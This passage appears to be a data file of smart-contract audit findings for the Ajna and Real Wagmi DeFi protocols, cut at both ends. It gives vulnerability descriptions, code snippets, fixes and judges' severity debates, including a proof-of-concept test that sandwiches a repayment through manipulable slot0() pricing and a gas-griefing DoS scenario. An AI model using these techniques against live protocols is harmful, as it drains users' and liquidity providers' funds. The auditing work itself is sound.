being said, perhaps the deviation of the implementation from the specification warrants it being a medium risk finding regardless.\nEdit: To be extra clear, there is no attack vector here. The vulnerability is simply that the kicker/taker will not receive/pay the amount of fees that they expect according to the white paper. There is no way to exploit it for profit.\nneeksec\nI think @kadenzipfel is right, there is no attack vector here.\n```\nThus, it would be a reasonable design decision to make it such that if the auctionPrice == NP, that no one pays a fee.\n```\n\nThere is no deviation of the implementation from the specification. This behavior is described in `Section 7.3 Liquidation Bonds` of the whitepaper. The graph in that section clearly shows that when auction price equals NP, the profit/loss to kicker should be zero.\n\nCzar102\n@santipu03 would you agree with the above?\nsantipu03\nThere is no deviation of the implementation from the specification. This behavior is described in Section 7.3 Liquidation Bonds of the whitepaper. The graph in that section clearly shows that when auction price equals NP, the profit/loss to kicker should be zero.\nIt's critical to understand that `BPF` is not determined by only one formula. The graph from above represents the `BPF` curve in case `TP < NP`, but my report is highlighting an inconsistency in the implementation in the cases where `TP >= NP`. The formulas used to calculate the `BPF` in both cases are not the same, refer to section 7.3.3 Determining the Reward or Penalty on the whitepaper for clarification.\nThus, it would be a reasonable design decision to make it such that if the auctionPrice == NP, that no one pays a fee.\nAs @Czar102 remarked on other issues, considerations about design choices are out of scope. The specification explicitly states that when `TP >= NP` and `NP = auctionPrice` then `BPF` must be `bondFactor`, instead the implementation makes `BPF = 0` in those cases.\nThis discrepancy leads to significant consequences: kickers lose rewards and borrowers lose assets, as `TPF` (Take Penalty Factor) is higher than it should be. Furthermore, this creates an attack vector: with an inflated `TPF`, takers are incentivized to exploit the situation, paying less for borrower collateral when `auctionPrice = NP`, as well as griefing the kicker.\nneeksec\nI agree that the graph is for case `TP < NP` and is not relevant to this issue.\n`The specification explicitly states that when TP >= NP and NP = auctionPrice then BPF must be bondFactor`\n@santipu03 Can you show where this is stated?\nsantipu03\nAs outlined in my previous message, section 7.3.3 Determining the Reward or Penalty:\n\ndmitriia\nBy definition of `NP`, which is neutral price level, when AP == `NP` the reward have to be zero.\nI don't like drastic swings the formula produces when TP is at or above NP either, but this is a corner case state, achievable on the series of subsequent takes only as initially NP to TP ratio NP defined with is above 1.\nThis corner case should ideally go away when TP becomes snapshotted.\nCzar102\nIt seems that the issue is the difference between the implementation and the documentation. The loss of funds @santipu03 refers to is the loss of funds that happens when parties have an expectation for the contract to behave as described in the documentation. If the documentation was different (stating that `BPF == 0` for auctionPrice == NP), there wouldn't be an issue.\nIs that right? @dmitriia @santipu03\ndmitriia\nYes, as per base NP definition from 7.3 of 10-12-2023 whitepaper\nthe NP is the price at which a kicker will have their bond returned to them without penalty or reward (thus being considered a neutral outcome from the kicker's perspective)\nany deviations from that are issues by themselves, and in this case it looks like it's the documentation one, where it needs to be corrected.\nsantipu03\nDuring the contest, I encountered this issue and immediately reached out to the sponsors to clarify whether it was a discrepancy in the documentation or an actual flaw in the implementation. The response I received was this:\n\nIt's important to note that the determination of whether an issue is a documentation mistake or an implementation flaw rests with the development team, not the auditors. Considering the high likelihood and potential for fund loss, I believe this issue deserves a medium/high severity rating.\nIn comparison, when I reported issue #19, it was classified as informational since it was merely a documentation error. However, this current issue clearly stems from an implementation mistake as per the sponsor's comment, setting it apart from the previous one.\nCzar102\nI wanted to decide whether it should be medium or high. If the contracts work properly for both options, but the implementation is different than the documentation and the expectation of a different behavior can implicitly make users lose funds, the issue will be considered medium severity.\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nsantipu03: accepted"чThe kicker will lose the rewards in that `take` action if the previous conditions are satisfied.\nWhile the probability of this conditions to be met is not usual, the impact is the loss of rewards for that kicker and that may cause to lose part of the bond if later a `take` is performed with a negative `BPF`.\nCode Snippet\nTool used\nManual Review
First pool borrower pays extra interestчmediumч```\nfunction drawDebt(\n    address borrowerAddress_,\n    uint256 amountToBorrow_,\n    uint256 limitIndex_,\n    uint256 collateralToPledge_\n) external nonReentrant {\n    PoolState memory poolState = _accruePoolInterest();\n\n   // rest of code\n\n    DrawDebtResult memory result = BorrowerActions.drawDebt(\n        auctions,\n        deposits,\n        loans,\n        poolState,\n        _availableQuoteToken(),\n        borrowerAddress_,\n        amountToBorrow_,\n        limitIndex_,\n        collateralToPledge_\n    );\n\n    // rest of code\n\n    // update pool interest rate state\n    _updateInterestState(poolState, result.newLup);\n\n   // rest of code\n}\n```\nчFor any function in which the current interest rate is important in a pool, we compute interest updates by accruing with `_accruePoolInterest` at the start of the function, then execute the main logic, then update the interest state accordingly with `_updateInterestState`. See below a simplified example for ERC20Pool.drawDebt:\n```\nfunction drawDebt(\n    address borrowerAddress_,\n    uint256 amountToBorrow_,\n    uint256 limitIndex_,\n    uint256 collateralToPledge_\n) external nonReentrant {\n    PoolState memory poolState = _accruePoolInterest();\n\n   // rest of code\n\n    DrawDebtResult memory result = BorrowerActions.drawDebt(\n        auctions,\n        deposits,\n        loans,\n        poolState,\n        _availableQuoteToken(),\n        borrowerAddress_,\n        amountToBorrow_,\n        limitIndex_,\n        collateralToPledge_\n    );\n\n    // rest of code\n\n    // update pool interest rate state\n    _updateInterestState(poolState, result.newLup);\n\n   // rest of code\n}\n```\n\nWhen accruing interest in `_accruePoolInterest`, we only update the state if `poolState_.t0Debt != 0`. Most notably, we don't set `poolState_.isNewInterestAccrued`. See below simplified logic from _accruePoolInterest:\n```\n// check if t0Debt is not equal to 0, indicating that there is debt to be tracked for the pool\nif (poolState_.t0Debt != 0) {\n    // rest of code\n\n    // calculate elapsed time since inflator was last updated\n    uint256 elapsed = block.timestamp - inflatorState.inflatorUpdate;\n\n    // set isNewInterestAccrued field to true if elapsed time is not 0, indicating that new interest may have accrued\n    poolState_.isNewInterestAccrued = elapsed != 0;\n\n    // rest of code\n}\n```\n\nOf course before we actually update the state from the first borrow, the debt of the pool is 0, and recall that `_accruePoolInterest` runs before the main state changing logic of the function in `BorrowerActions.drawDebt`.\nAfter executing the main state changing logic in `BorrowerActions.drawDebt`, where we update state, including incrementing the pool and borrower debt as expected, we run the logic in `_updateInterestState`. Here we update the inflator if either `poolState_.isNewInterestAccrued` or `poolState_.debt == 0`.\n```\n// update pool inflator\nif (poolState_.isNewInterestAccrued) {\n    inflatorState.inflator       = uint208(poolState_.inflator);\n    inflatorState.inflatorUpdate = uint48(block.timestamp);\n// if the debt in the current pool state is 0, also update the inflator and inflatorUpdate fields in inflatorState\n// slither-disable-next-line incorrect-equality\n} else if (poolState_.debt == 0) {\n    inflatorState.inflator       = uint208(Maths.WAD);\n    inflatorState.inflatorUpdate = uint48(block.timestamp);\n}\n```\n\nThe problem here is that since there was no debt at the start of the function, `poolState_.isNewInterestAccrued` is false and since there is debt now at the end of the function, `poolState_.debt == 0` is also false. As a result, the inflator is not updated. Updating the inflator here is paramount since it effectively marks a starting time at which interest accrues on the borrowers debt. Since we don't update the inflator, the borrowers debt effectively started accruing interest at the time of the last inflator update, which is an arbitrary duration.\n```\nfunction testPoolBorrowAndRepay() external tearDown {\n    // check balances before borrow\n    assertEq(_quote.balanceOf(address(_pool)), 50_000 * 1e18);\n    assertEq(_quote.balanceOf(_lender),        150_000 * 1e18);\n\n    // @audit skip 100 days to break test\n    skip(100 days);\n\n    _drawDebt({\n        from: _borrower,\n        borrower: _borrower,\n        amountToBorrow: 21_000 * 1e18,\n        limitIndex: 3_000,\n        collateralToPledge: 100 * 1e18,\n        newLup: 2_981.007422784467321543 * 1e18\n    });\n\n    // rest of code\n}\n```\n\nUnlike the result without skipping time before drawing debt, the test fails with output logs being off by amounts roughly corresponding to the unexpected interest.ч
Function `_indexOf` will cause a settlement to revert if `auctionPrice > MAX_PRICE`чmediumч```\nif (price_ < MIN_PRICE || price_ > MAX_PRICE) revert BucketPriceOutOfBounds();\n```\nчIn ERC721 pools, when a settlement occurs and the borrower still have some fraction of collateral, that fraction is allocated in the bucket with a price closest to `auctionPrice` and the borrower is proportionally compensated with LPB in that bucket.\nIn order to calculate the index of the bucket closest in price to `auctionPrice`, the `_indexOf` function is called. The first line of that function is outlined below:\n```\nif (price_ < MIN_PRICE || price_ > MAX_PRICE) revert BucketPriceOutOfBounds();\n```\n\nThe `_indexOf` function will revert if `price_` (provided as an argument) is below `MIN_PRICE` or above `MAX_PRICE`. This function is called from `_settleAuction`, here is a snippet of that:\n```\nfunction _settleAuction(\n    AuctionsState storage auctions_,\n    mapping(uint256 => Bucket) storage buckets_,\n    DepositsState storage deposits_,\n    address borrowerAddress_,\n    uint256 borrowerCollateral_,\n    uint256 poolType_\n) internal returns (uint256 remainingCollateral_, uint256 compensatedCollateral_) {\n\n    // // rest of code\n\n            uint256 auctionPrice = _auctionPrice(\n                auctions_.liquidations[borrowerAddress_].referencePrice,\n                auctions_.liquidations[borrowerAddress_].kickTime\n            );\n\n            // determine the bucket index to compensate fractional collateral\n>         bucketIndex = auctionPrice > MIN_PRICE ? _indexOf(auctionPrice) : MAX_FENWICK_INDEX;\n\n    // // rest of code\n}\n```\n\nThe `_settleAuction` function first calculates the `auctionPrice` and then it gets the index of the bucket with a price closest to `bucketPrice`. If `auctionPrice` results to be bigger than `MAX_PRICE`, then the `_indexOf` function will revert and the entire settlement will fail.\nIn certain types of pools where one asset has an extremely low market price and the other is valued really high, the resulting prices at an auction can be so high that is not rare to see an `auctionPrice > MAX_PRICE`.\nThe `auctionPrice` variable is computed from `referencePrice` and it goes lower through time until 72 hours have passed. Also, `referencePrice` can be much higher than `MAX_PRICE`, as outline in _kick:\n```\nvars.referencePrice = Maths.min(Maths.max(vars.htp, vars.neutralPrice), MAX_INFLATED_PRICE);\n```\n\nThe value of `MAX_INFLATED_PRICE` is exactly 50 * `MAX_PRICE` so a `referencePrice` bigger than `MAX_PRICE` is totally possible.\nIn auctions where `referencePrice` is bigger than `MAX_PRICE` and the auction is settled in a low time frame, `auctionPrice` will be also bigger than `MAX_PRICE` and that will cause the entire transaction to revert.ч"It's recommended to change the affected line of `_settleAuction` in the following way:\n```\n// Remove the line below\n   bucketIndex = auctionPrice > MIN_PRICE ? _indexOf(auctionPrice) : MAX_FENWICK_INDEX;\n// Add the line below\n   if(auctionPrice < MIN_PRICE){\n// Add the line below\n       bucketIndex = MAX_FENWICK_INDEX;\n// Add the line below\n   } else if (auctionPrice > MAX_PRICE) {\n// Add the line below\n       bucketIndex = 1;\n// Add the line below\n   } else {\n// Add the line below\n       bucketIndex = _indexOf(auctionPrice);\n// Add the line below\n   }\n```\n\nDiscussion\nneeksec\nValid finding. Set to `Medium` because I don't see `the potential losses for the kicker of that auction`. This revert happens under extreme market condition and the it could recovery as time elapses.\ndmitriia\nEscalate\nSince for `_settleAuction()` called outside of taking the exact time of settlement does not matter, the only remaining case is calling it in the taking workflow, and there the impact is that taker has to wait for the auction price to go under the limit. This is actually beneficial for the kicker since lower execution price means higher kicker's reward. Also, it is beneficial for the taker as they pay less, and the losing party is the borrower.\nGiven that `MAX_PRICE` is by definition set at a very high level that will not be achieved practically in the vast majority of the pools, the probability of the scenario is very low. Basically the only practical case I can see at the moment is that quote token defaults/breaks and its valuation goes to zero. In this case it will not matter for the borrower at what exactly price the auction was settled. This way based on the very low probability and not straightforward materiality of the impact, that can be estimated as low/medium, I would categorize the overall severity to be low.\nsherlock-admin2\nEscalate\nSince for `_settleAuction()` called outside of taking the exact time of settlement does not matter, the only remaining case is calling it in the taking workflow, and there the impact is that taker has to wait for the auction price to go under the limit. This is actually beneficial for the kicker since lower execution price means higher kicker's reward. Also, it is beneficial for the taker as they pay less, and the losing party is the borrower.\nGiven that `MAX_PRICE` is by definition set at a very high level that will not be achieved practically in the vast majority of the pools, the probability of the scenario is very low. Basically the only practical case I can see at the moment is that quote token defaults/breaks and its valuation goes to zero. In this case it will not matter for the borrower at what exactly price the auction was settled. This way based on the very low probability and not straightforward materiality of the impact, that can be estimated as low/medium, I would categorize the overall severity to be low.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nkadenzipfel\nFrom the judging docs: ""Could Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue? It would not count if the DOS, etc. lasts a known, finite amount of time <1 year.""\nsantipu03\n@dmitriia Agree that this issue will actually benefit the kicker and taker, making the borrower the losing party. Also agree that the impact is that takers will have to wait for `auctionPrice` to go lower than `MAX_PRICE`. And this can create the following scenario where a kicker unfairly profits from a borrower:\nMarket price in a pool is higher than `MAX_PRICE` (only feasible on a few pools)\nBob is a borrower that's collateralized enough so kicking him would cause a loss on kicker.\nA malicious lender can kick Bob knowing that the auction won't settle until `auctionPrice` is below `MAX_PRICE`, then the kicker will be receiving more profits from the bond, thus profiting off the borrower.\nTherefore, Bob will be receiving less tokens from the auction as expected, and the kicker will be pocketing a profit taking advantage of this bug.\nOn the other hand, the only pools affected by this issue would be pools with a high difference in valuation (e.g. `BTC/SHIBA`, `ETH/SHIBA`, etc). Because the difference of valuation of a unit of token on these pools is huge, it'd be pretty easy to achieve `MAX_PRICE`. For example:\nMarket Price BTC/SHIBA: `4_295_487_804 * 1e18`\nMarket Price ETH/SHIBA: `229_958_536 * 1e18`\nMAX_PRICE in Ajna = `1_004_968_987 * 1e18`\nAchieving `MAX_PRICE` is not unfeasible in these sort of pools.\n@kadenzipfel A DoS by itself doesn't qualify for a medium/high but in the case of this issue it also implies the loss of borrower funds.\nGiven that Ajna will be an immutable protocol that aims to support this kind of pools, the impact of this issue is high. And because these sort of pools only represents a minority, the probability of this happening is medium/low. Therefore, I think the fair severity for this issue is medium.\nkadenzipfel\nA malicious lender can kick Bob knowing that the auction won't settle until auctionPrice is below MAX_PRICE, then the kicker will be receiving more profits from the bond, thus profiting off the borrower.\nIt seems what you're trying to argue here is that you can't `take` the full amount auctioned because it will attempt to settle the auction if the remaining `borrower_.t0Debt == 0`, see `TakerActions:L524-539` below:\n```\n// if debt is fully repaid, settle the auction\nif (borrower_.t0Debt == 0) {\n    settledAuction_ = true;\n\n    // settle auction and update borrower's collateral with value after settlement\n    (remainingCollateral_, compensatedCollateral_) = SettlerActions._settleAuction(\n        auctions_,\n        buckets_,\n        deposits_,\n        borrowerAddress_,\n        borrower_.collateral,\n        poolState_.poolType\n    );\n\n    borrower_.collateral = remainingCollateral_;\n}\n```\n\nThe flaw with your argument is that you can still `take` at whatever the current auction price is as long as you leave some `borrower_.t0Debt` so that we don't get the unexpected revert in `_settleAuction`. So the borrower could easily `take` most of the auctioned debt at a favourable price, resulting in a loss for the kicker, maintaining intended system incentives.\nsantipu03\nThe flaw with your argument is that you can still take at whatever the current auction price is as long as you leave some borrower_.t0Debt so that we don't get the unexpected revert in _settleAuction. So the borrower could easily take most of the auctioned debt at a favourable price, resulting in a loss for the kicker, maintaining intended system incentives.\nThis isn't true in ERC721 pools because is required to `take` a minimum of one unit of collateral (1e18) for every `take` action.\n```\n// for NFT take make sure the take flow and bond change calculation happens for the rounded collateral that can be taken\nif (params_.poolType == uint8(PoolType.ERC721)) {\n    takeableCollateral = (takeableCollateral / 1e18) * 1e18;\n}\n```\n\n```\nif (params_.poolType == uint8(PoolType.ERC721)) {\n    // slither-disable-next-line divide-before-multiply\n    uint256 collateralTaken = (vars_.collateralAmount / 1e18) * 1e18; // solidity rounds down, so if 2.5 it will be 2.5 / 1 = 2\n\n    // collateral taken not a round number\n    if (collateralTaken != vars_.collateralAmount) {\n        if (Maths.min(borrower_.collateral, params_.takeCollateral) >= collateralTaken + 1e18) {\n            // round up collateral to take\n            collateralTaken += 1e18;\n\n            // taker should send additional quote tokens to cover difference between collateral needed to be taken and rounded collateral, at auction price\n            // borrower will get quote tokens for the difference between rounded collateral and collateral taken to cover debt\n            vars_.excessQuoteToken = Maths.wmul(collateralTaken - vars_.collateralAmount, vars_.auctionPrice);\n            vars_.collateralAmount = collateralTaken;\n        } else {\n            // shouldn't get here, but just in case revert\n            revert CollateralRoundingNeededButNotPossible();\n        }\n    }\n}\n```\n\nTherefore, in ERC721 pools, the minimum amount of collateral to take is `1e18`, and this will prevent takers to take most of the collateral at a favourable price when collateral auctioned is low (e.g. 1 NFT).\ndmitriia\n@dmitriia Agree that this issue will actually benefit the kicker and taker, making the borrower the losing party. Also agree that the impact is that takers will have to wait for `auctionPrice` to go lower than `MAX_PRICE`. And this can create the following scenario where a kicker unfairly profits from a borrower: ... On the other hand, the only pools affected by this issue would be pools with a high difference in valuation (e.g. `BTC/SHIBA`, `ETH/SHIBA`, etc). Because the difference of valuation of a unit of token on these pools is huge, it'd be pretty easy to achieve `MAX_PRICE`. For example:\nMarket Price BTC/SHIBA: `4_295_487_804 * 1e18`\nMarket Price ETH/SHIBA: `229_958_536 * 1e18`\n`MAX_PRICE` in Ajna = `1_004_968_987 * 1e18`\nAchieving `MAX_PRICE` is not unfeasible in these sort of pools.\nThis means that until `MAX_PRICE` is increased `BTC/SHIBA` and alike pools will malfunction in Ajna, which needs to be communicated as pool creation is permissionless.\nRe ERC721 it looks like the attack is for `1e18` amount only as before that takes can avoid `_settleAuction()` by leaving this `1` NFT intact.\nsantipu03\nRe ERC721 it looks like the attack is for 1e18 amount only as before that takes can avoid _settleAuction() by leaving this 1 NFT intact.\nThe attack is most effective for auctions of `1e18` collateral, but it's still efective (though less impactful) with auctions for more amount of collateral.\nFor example, in case of an auction of `2.1e18` collateral the borrower will receive the fair price for 1 NFT but a lower price for the other NFT. This unfair price for the last NFT of an auction can be the difference between a kicker winning over a bond or losing part or it.\nAs said, the probability is kind of low but the impact is high so I think the fair severity is medium.\nEvert0x\n@kadenzipfel @dmitriia do you have any follow up arguments? If not I will keep the issue state as is.\ndmitriia\n@kadenzipfel @dmitriia do you have any follow up arguments? If not I will keep the issue state as is.\nI'm fine with medium as issue highlights the important enough limitations (first of all, `MAX_PRICE` looks to be too low) for extreme pairs of tokens, which are relevant due to permissionless nature of Ajna pools.\nCzar102\nTo me it looks like a limitation introduced by `MAX_PRICE`, which seems to be a design choice, hence should be out of scope. @santipu03 please let me know if that's accurate. If yes, I will be accepting the escalation and closing the issue.\nsantipu03\nI don't think this issue is because of a design choice. In ERC20 pools, taking collateral from auctions with `auctionPrice > MAX_PRICE` is always possible. This is also true in ERC721 pools when dealing with integer collateral (e.g., 1e18). However, the problem arises specifically in ERC721 pools with fractioned collateral (e.g., 1.5e18). This inconsistency points to the issue being a bug, not an intended feature.\nIf it were a design choice, the issue would appear in all pool types under any scenario. Instead, it only happens in ERC721 pools with fractioned collateral, further indicating it's an unintentional bug.\nThe protocol allows for takers to take collateral in an auction with a price above `MAX_PRICE`, therefore this issue is not a design choice but a bug. The fix proposed in the report addresses and corrects this issue, reinforcing the idea that it's a bug and not a designed aspect of the protocol.\nCzar102\nSorry for my misunderstanding. Thank you for the explanation. I plan on rejecting the escalation and leaving the issue as is.\nCzar102\nResult: Medium Unique\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\ndmitriia: rejected"чWhen the above conditions are met, the auction won't be able to settle until `auctionPrice` lowers below `MAX_PRICE`.\nIn ERC721 pools with a high difference in assets valuation, there is no low-probability prerequisites and the impact will be a violation of the system design, as well as the potential losses for the kicker of that auction, so setting severity to be high\nCode Snippet\nTool used\nManual Review
No slippage protection during repayment due to dynamic slippage params and easily influenced `slot0()`чhighч```\n     function _getCurrentSqrtPriceX96(\n        bool zeroForA,\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) private view returns (uint160 sqrtPriceX96) {\n        if (!zeroForA) {\n            (tokenA, tokenB) = (tokenB, tokenA);\n        }\n        address poolAddress = computePoolAddress(tokenA, tokenB, fee);\n        (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(poolAddress).slot0(); //@audit-issue can be easily manipulated\n    }\n```\nч"The absence of slippage protection can be attributed to two key reasons. Firstly, the `sqrtPrice` is derived from `slot0()`, which can be easily manipulated:\n```\n     function _getCurrentSqrtPriceX96(\n        bool zeroForA,\n        address tokenA,\n        address tokenB,\n        uint24 fee\n    ) private view returns (uint160 sqrtPriceX96) {\n        if (!zeroForA) {\n            (tokenA, tokenB) = (tokenB, tokenA);\n        }\n        address poolAddress = computePoolAddress(tokenA, tokenB, fee);\n        (sqrtPriceX96, , , , , , ) = IUniswapV3Pool(poolAddress).slot0(); //@audit-issue can be easily manipulated\n    }\n```\n\nThe calculated `sqrtPriceX96` is used to determine the amounts for restoring liquidation and the number of holdTokens to be swapped for saleTokens:\n```\n(uint256 holdTokenAmountIn, uint256 amount0, uint256 amount1) = _getHoldTokenAmountIn(\n                params.zeroForSaleToken,\n                cache.tickLower,\n                cache.tickUpper,\n                cache.sqrtPriceX96,\n                loan.liquidity,\n                cache.holdTokenDebt\n            );\n```\n\nAfter that, the number of `SaleTokemAmountOut` is gained based on the sqrtPrice via QuoterV2.\nThen, the slippage params are calculated `amountOutMinimum: (saleTokenAmountOut * params.slippageBP1000) / Constants.BPS })` However, the `saleTokenAmountOut` is a dynamic number calculated on the current state of the blockchain, based on the calculations mentioned above. This will lead to the situation that the swap will always satisfy the `amountOutMinimum`.\nAs a result, if the repayment of the user is sandwiched (frontrunned), the profit of the repayer is decreased till the repayment satisfies the restored liquidity.\nA Proof of Concept (PoC) demonstrates the issue with comments. Although the swap does not significantly impact a strongly founded pool, it does result in a loss of a few dollars for the repayer.\n```\n       let amountWBTC = ethers.utils.parseUnits(""0.05"", 8); //token0\n        const deadline = (await time.latest()) + 60;\n        const minLeverageDesired = 50;\n        const maxCollateralWBTC = amountWBTC.div(minLeverageDesired);\n\n        const loans = [\n            {\n                liquidity: nftpos[3].liquidity,\n                tokenId: nftpos[3].tokenId,\n            },\n        ];\n\n        const swapParams: ApproveSwapAndPay.SwapParamsStruct = {\n            swapTarget: constants.AddressZero,\n            swapAmountInDataIndex: 0,\n            maxGasForCall: 0,\n            swapData: swapData,\n        };\n\nlet  params = {\n            internalSwapPoolfee: 500,\n            saleToken: WETH_ADDRESS,\n            holdToken: WBTC_ADDRESS,\n            minHoldTokenOut: amountWBTC,\n            maxCollateral: maxCollateralWBTC,\n            externalSwap: swapParams,\n            loans: loans,\n        };\n\nawait borrowingManager.connect(bob).borrow(params, deadline);\n\nconst borrowingKey = await borrowingManager.userBorrowingKeys(bob.address, 0);\n        const swapParamsRep: ApproveSwapAndPay.SwapParamsStruct = {\n            swapTarget: constants.AddressZero,\n            swapAmountInDataIndex: 0,\n            maxGasForCall: 0,\n            swapData: swapData,\n        };\n\n       \n        amountWBTC = ethers.utils.parseUnits(""0.06"", 8); //token0\n\nlet swapping: ISwapRouter.ExactInputSingleParamsStruct = {\n            tokenIn: WBTC_ADDRESS,\n            tokenOut: WETH_ADDRESS,\n            fee: 500,\n            recipient: alice.address,\n            deadline: deadline,\n            amountIn: ethers.utils.parseUnits(""100"", 8),\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        };\n        await router.connect(alice).exactInputSingle(swapping);\n        console.log(""Swap success"");\n\n let paramsRep: LiquidityBorrowingManager.RepayParamsStruct = {\n            isEmergency: false,\n            internalSwapPoolfee: 500,\n            externalSwap: swapParamsRep,\n            borrowingKey: borrowingKey,\n            swapSlippageBP1000: 990, //<=slippage simulated\n        };\n await borrowingManager.connect(bob).repay(paramsRep, deadline);\n        // Without swap\n// Balance of hold token after repay:  BigNumber { value: ""993951415"" }\n// Balance of sale token after repay:  BigNumber { value: ""99005137946252426108"" }\n// When swap\n// Balance of hold token after repay:  BigNumber { value: ""993951415"" }\n// Balance of sale token after repay:  BigNumber { value: ""99000233164653177505"" }\n```\n\nThe following table shows difference of recieved sale token:\nSwap before repay transaction Token Balance of user after Repay\nNo WETH 99005137946252426108\nYes WETH 99000233164653177505\nThe difference in the profit after repayment is 4904781599248603 weis, which is at the current market price of around 8 USD. The profit loss will depend on the liquidity in the pool, which depends on the type of pool and related tokens."ч
DoS of lenders and gas griefing by packing tokenIdToBorrowingKeys arraysчmediumч```\n    function _addKeysAndLoansInfo(\n        bool update,\n        bytes32 borrowingKey,\n        LoanInfo[] memory sourceLoans\n    ) private {\n        // Get the storage reference to the loans array for the borrowing key\n        LoanInfo[] storage loans = loansInfo[borrowingKey];\n        // Iterate through the sourceLoans array\n        for (uint256 i; i < sourceLoans.length; ) {\n            // Get the current loan from the sourceLoans array\n            LoanInfo memory loan = sourceLoans[i];\n            // Get the storage reference to the tokenIdLoansKeys array for the loan's token ID\n            bytes32[] storage tokenIdLoansKeys = tokenIdToBorrowingKeys[loan.tokenId];\n            // Conditionally add or push the borrowing key to the tokenIdLoansKeys array based on the 'update' flag\n            update\n                ? tokenIdLoansKeys.addKeyIfNotExists(borrowingKey)\n                : tokenIdLoansKeys.push(borrowingKey);\n    // rest of code\n```\nч`LiquidityBorrowingManager.borrow()` calls the function `_addKeysAndLoansInfo()`, which adds user keys to the `tokenIdToBorrowingKeys` array of the borrowed-from LP position:\n```\n    function _addKeysAndLoansInfo(\n        bool update,\n        bytes32 borrowingKey,\n        LoanInfo[] memory sourceLoans\n    ) private {\n        // Get the storage reference to the loans array for the borrowing key\n        LoanInfo[] storage loans = loansInfo[borrowingKey];\n        // Iterate through the sourceLoans array\n        for (uint256 i; i < sourceLoans.length; ) {\n            // Get the current loan from the sourceLoans array\n            LoanInfo memory loan = sourceLoans[i];\n            // Get the storage reference to the tokenIdLoansKeys array for the loan's token ID\n            bytes32[] storage tokenIdLoansKeys = tokenIdToBorrowingKeys[loan.tokenId];\n            // Conditionally add or push the borrowing key to the tokenIdLoansKeys array based on the 'update' flag\n            update\n                ? tokenIdLoansKeys.addKeyIfNotExists(borrowingKey)\n                : tokenIdLoansKeys.push(borrowingKey);\n    // rest of code\n```\n\nA user key is calculated in the `Keys` library like so:\n```\n    function computeBorrowingKey(\n        address borrower,\n        address saleToken,\n        address holdToken\n    ) internal pure returns (bytes32) {\n        return keccak256(abi.encodePacked(borrower, saleToken, holdToken));\n    }\n```\n\nSo every time a new user borrows some amount from a LP token, a new `borrowKey` is added to the `tokenIdToBorrowingKeys[LP_Token_ID]` array. The problem is that this array is iterated through by calling iterating methods (addKeyIfNotExists() or removeKey()) in the `Keys` library when updating a borrow (as seen in the first code block). Furthermore, emergency repays call `removeKey()` in `_calculateEmergencyLoanClosure()`, non-emergency repays call `removeKey()` in `_removeKeysAndClearStorage()`, and `takeOverDebt()` calls `removeKey()` in `_removeKeysAndClearStorage()`. The result is that all exit/repay/liquidation methods must iterate through the array. Both of the iterating methods in the `Keys` library access storage to compare array values to the key passed as argument, so every key in the array before the argument key will increase the gas cost of the transaction by (more than) a cold `SLOAD`, which costs 2100 gas (https://eips.ethereum.org/EIPS/eip-2929). Library methods below:\n```\n    function addKeyIfNotExists(bytes32[] storage self, bytes32 key) internal {\n        uint256 length = self.length;\n        for (uint256 i; i < length; ) {\n            if (self.unsafeAccess(i).value == key) {\n                return;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n        self.push(key);\n    }\n\n    function removeKey(bytes32[] storage self, bytes32 key) internal {\n        uint256 length = self.length;\n        for (uint256 i; i < length; ) {\n            if (self.unsafeAccess(i).value == key) {\n                self.unsafeAccess(i).value = self.unsafeAccess(length - 1).value;\n                self.pop();\n                break;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n    }\n```\n\nLet's give an example to see the potential impact and cost of the attack:ч`tokenIdToBorrowingKeys` tracks borrowing keys and is used in view functions to return info (getLenderCreditsCount() and getLenderCreditsInfo()). This functionality is easier to implement with arrays, but it can be done with mappings to reduce gas costs and prevent gas griefing and DoS attacks. For example the protocol can emit the borrows for all LP tokens and keep track of them offchain, and pass borrow IDs in an array to a view function to look them up in the mapping. Alternatively, OpenZeppelin's EnumerableSet library could be used to replace the array and keep track of all the borrows on-chain.\nDiscussion\nfann95\nFixed: https://github.com/RealWagmi/wagmi-leverage/commit/cb4d91fdc632b1a4496932ec4546c7f4fa78e842чArray packing causes users to spend more gas on loans of the affected LP token. User transactions may out-of-gas revert due to increased gas costs. An attacker can lock liquidity from LPs in the contract for arbitrary periods of time for asymmetric cost favoring the attacker. The LP will earn very little fees over the period of the DoS.\nCode Snippet\nTool used\nManual Review
Incorrect calculations of borrowingCollateral leads to DoS for positions in the current tick range due to underflowчmediumч```\nuint256 borrowingCollateral = cache.borrowedAmount - cache.holdTokenBalance;\n```\nчThis calculation is most likely to underflow\n```\nuint256 borrowingCollateral = cache.borrowedAmount - cache.holdTokenBalance;\n```\n\nThe `cache.borrowedAmount` is the calculated amount of holdTokens based on the liquidity of a position. `cache.holdTokenBalance` is the balance of holdTokens queried after liquidity extraction and tokens transferred to the `LiquidityBorrowingManager`. If any amounts of the saleToken are transferred as well, these are swapped to holdTokens and added to `cache.holdTokenBalance`.\nSo in case when liquidity of a position is in the current tick range, both tokens would be transferred to the contract and saleToken would be swapped for holdToken and then added to `cache.holdTokenBalance`. This would make `cache.holdTokenBalance` > cache.borrowedAmount since `cache.holdTokenBalance == cache.borrowedAmount + amount of sale token swapped` and would make the tx revert due to underflow.чThe borrowedAmount should be subtracted from holdTokenBalance\n```\nuint256 borrowingCollateral = cache.holdTokenBalance - cache.borrowedAmount;\n```\n\nDiscussion\nAli-Shehab\nEscalate\nFirst issue has nothing to do with the other ones. It must not be duplicate\n[peanuts - Max collateral check is not done when increasing collateral balance] https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/37\nsherlock-admin2\nEscalate\nFirst issue has nothing to do with the other ones. It must not be duplicate\n[peanuts - Max collateral check is not done when increasing collateral balance] https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/37\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nfann95\nFixed: 